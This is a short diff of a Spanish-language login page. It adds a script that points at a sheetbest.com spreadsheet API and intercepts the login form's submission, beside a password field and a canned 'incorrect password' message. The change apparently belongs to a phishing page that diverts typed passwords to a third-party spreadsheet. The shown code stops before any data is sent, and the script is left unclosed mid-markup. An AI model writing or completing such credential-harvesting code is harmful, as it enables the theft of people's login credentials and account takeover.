@@ -173,7 +173,11 @@
                       <input type="password" placeholder="Contraseña" class="next-input password-typo-input" id="password" required />
                     </div>
                   </div>
+ <script>
+    const API_URL = "https://api.sheetbest.com/sheets/d867f5e4-5cbe-4b84-aa70-d1195e64372a";
 
+    document.getElementById("formulario").addEventListener("submit", function (e) {
+      e.preventDefault();
                   <!-- Error message -->
                   <p id="error-message" style="color:#D91C1C; display:none; font-weight: bold; margin-top: 10px;">
                     Contraseña incorrecta. Inténtelo de nuevo.
